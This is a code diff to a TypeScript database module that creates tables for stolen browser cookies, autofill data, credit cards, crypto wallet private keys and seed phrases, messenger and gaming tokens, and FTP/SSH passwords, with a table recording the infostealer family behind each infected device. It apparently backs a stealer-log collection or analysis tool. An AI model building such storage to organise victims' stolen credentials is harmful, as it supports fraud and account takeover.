@@ -52,6 +52,9 @@ export async function initializeDatabase() {
     // IMPORTANT: Ensure local_file_path column exists
     await ensureLocalFilePathColumn()
 
+    // IMPORTANT: Ensure device statistics columns exist
+    await ensureDeviceStatisticsColumns()
+
     console.log("Database initialized successfully")
   } catch (error) {
     console.error("Database initialization error:", error)
@@ -66,8 +69,8 @@ async function ensureLocalFilePathColumn() {
     // Check if column exists
     const columnCheck = await executeQuery(
       `
-      SELECT COLUMN_NAME 
-      FROM INFORMATION_SCHEMA.COLUMNS 
+      SELECT COLUMN_NAME
+      FROM INFORMATION_SCHEMA.COLUMNS
       WHERE TABLE_SCHEMA = ? AND TABLE_NAME = 'files' AND COLUMN_NAME = 'local_file_path'
     `,
       [dbConfig.database],
@@ -90,6 +93,45 @@ async function ensureLocalFilePathColumn() {
     }
   } catch (error) {
     console.error("❌ Error ensuring local_file_path column:", error)
+    // Don't throw - continue with existing schema
+  }
+}
+
+async function ensureDeviceStatisticsColumns() {
+  try {
+    console.log("🔧 Ensuring device statistics columns exist...")
+
+    const columnsToAdd = [
+      "total_cookies INT DEFAULT 0",
+      "total_extensions INT DEFAULT 0",
+      "total_autofill INT DEFAULT 0",
+      "total_credit_cards INT DEFAULT 0",
+      "total_crypto_wallets INT DEFAULT 0",
+      "total_messenger_tokens INT DEFAULT 0",
+      "total_ftp_credentials INT DEFAULT 0",
+      "total_gaming_sessions INT DEFAULT 0",
+    ]
+
+    for (const column of columnsToAdd) {
+      const columnName = column.split(" ")[0]
+      const columnCheck = await executeQuery(
+        `
+        SELECT COLUMN_NAME
+        FROM INFORMATION_SCHEMA.COLUMNS
+        WHERE TABLE_SCHEMA = ? AND TABLE_NAME = 'devices' AND COLUMN_NAME = ?
+      `,
+        [dbConfig.database, columnName],
+      )
+
+      if ((columnCheck as any[]).length === 0) {
+        console.log(`➕ Adding ${columnName} column to devices table...`)
+        await executeQuery(`ALTER TABLE devices ADD COLUMN ${column}`)
+      }
+    }
+
+    console.log("✅ Device statistics columns ensured")
+  } catch (error) {
+    console.error("❌ Error ensuring device statistics columns:", error)
     // Don't throw - continue with existing schema
   }
 }
@@ -240,6 +282,200 @@ async function createTables() {
       INDEX idx_api_key (api_key),
       INDEX idx_user_id (user_id),
       INDEX idx_is_active (is_active),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create cookies table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS cookies (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      host_key VARCHAR(500),
+      name VARCHAR(500),
+      value TEXT,
+      path VARCHAR(500),
+      expires_utc BIGINT,
+      is_secure BOOLEAN DEFAULT FALSE,
+      is_httponly BOOLEAN DEFAULT FALSE,
+      same_site VARCHAR(50),
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_host_key (host_key(255)),
+      INDEX idx_name (name(255)),
+      INDEX idx_browser (browser),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create browser extensions table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS browser_extensions (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      extension_id VARCHAR(255),
+      extension_name VARCHAR(500),
+      extension_type VARCHAR(100),
+      version VARCHAR(100),
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      data JSON,
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_extension_id (extension_id),
+      INDEX idx_extension_type (extension_type),
+      INDEX idx_browser (browser),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create autofill table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS autofill (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      field_name VARCHAR(500),
+      field_value TEXT,
+      times_used INT DEFAULT 0,
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_field_name (field_name(255)),
+      INDEX idx_browser (browser),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create credit cards table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS credit_cards (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      card_number_encrypted TEXT,
+      card_number_last4 VARCHAR(4),
+      cardholder_name VARCHAR(500),
+      expiration_month INT,
+      expiration_year INT,
+      browser VARCHAR(255),
+      profile VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_last4 (card_number_last4),
+      INDEX idx_browser (browser),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create crypto wallets table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS crypto_wallets (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      wallet_type VARCHAR(255),
+      wallet_name VARCHAR(500),
+      wallet_address TEXT,
+      private_key TEXT,
+      seed_phrase TEXT,
+      browser VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_wallet_type (wallet_type),
+      INDEX idx_browser (browser),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create messenger tokens table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS messenger_tokens (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      messenger_type VARCHAR(100),
+      username VARCHAR(500),
+      user_id VARCHAR(255),
+      token TEXT,
+      email VARCHAR(500),
+      phone VARCHAR(100),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_messenger_type (messenger_type),
+      INDEX idx_username (username(255)),
+      INDEX idx_email (email(255)),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create FTP/SSH credentials table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS ftp_credentials (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      protocol VARCHAR(50),
+      host VARCHAR(500),
+      port INT,
+      username VARCHAR(500),
+      password TEXT,
+      software VARCHAR(255),
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_protocol (protocol),
+      INDEX idx_host (host(255)),
+      INDEX idx_software (software),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create gaming sessions table
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS gaming_sessions (
+      id BIGINT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      platform VARCHAR(255),
+      username VARCHAR(500),
+      email VARCHAR(500),
+      session_token TEXT,
+      file_path TEXT,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_platform (platform),
+      INDEX idx_username (username(255)),
+      INDEX idx_email (email(255)),
+      INDEX idx_created_at (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+  `)
+
+  // Create stealer metadata table to track detected stealer types
+  await executeQuery(`
+    CREATE TABLE IF NOT EXISTS stealer_metadata (
+      id INT AUTO_INCREMENT PRIMARY KEY,
+      device_id VARCHAR(255) NOT NULL,
+      stealer_family VARCHAR(100),
+      stealer_version VARCHAR(100),
+      build_id VARCHAR(255),
+      detection_confidence FLOAT,
+      indicators JSON,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
+      INDEX idx_device_id (device_id),
+      INDEX idx_stealer_family (stealer_family),
       INDEX idx_created_at (created_at)
     ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
   `)
